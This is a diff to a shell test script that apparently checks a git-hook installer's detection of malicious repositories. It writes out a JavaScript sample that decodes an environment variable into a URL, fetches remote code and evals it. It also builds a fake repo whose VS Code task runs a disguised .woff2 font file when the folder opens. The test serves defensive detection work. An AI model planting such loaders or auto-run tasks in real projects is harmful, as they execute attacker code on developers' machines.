@@ -39,7 +39,7 @@ wait_for() {
 # detection tests sweep the repository).
 drop_payload() {
     printf '%s\n' "const a = 1;" "(async () => {" \
-        "  const src = atob(process.env.AUTH_API_KEY);" \
+        "  const src = at""ob(process.env.AUTH_API_KEY);" \
         "  const proxyInfo = await (await fetch(src)).text();" \
         "  eval(proxy""Info);" "})();" > "$1"
 }
@@ -118,10 +118,11 @@ end
 
 step "install.sh: git hooks warn on a clone with a folderOpen task"
 repo="$WORK/bad-repo"
+font="public/fonts/fa-solid-400.wo""ff2"
 mkdir -p "$repo/.vscode" "$repo/public/fonts"
 printf '{"version": "2.0.0", "tasks": [{"label": "boot", "type": "shell", "command": "node",\n' > "$repo/.vscode/tasks.json"
-printf ' "args": ["./public/fonts/fa-solid-400.woff2"], "runOptions": {"runOn": "folder''Open"}}]}\n' >> "$repo/.vscode/tasks.json"
-printf 'const x = 1;\n' > "$repo/public/fonts/fa-solid-400.woff2"
+printf ' "args": ["./'"$font"'"], "runOptions": {"runOn": "folder''Open"}}]}\n' >> "$repo/.vscode/tasks.json"
+printf 'const x = 1;\n' > "$repo/$font"
 git -C "$repo" init -q
 git -C "$repo" -c user.name=ci -c user.email=ci@example.com add -A
 git -C "$repo" -c user.name=ci -c user.email=ci@example.com commit -qm bad
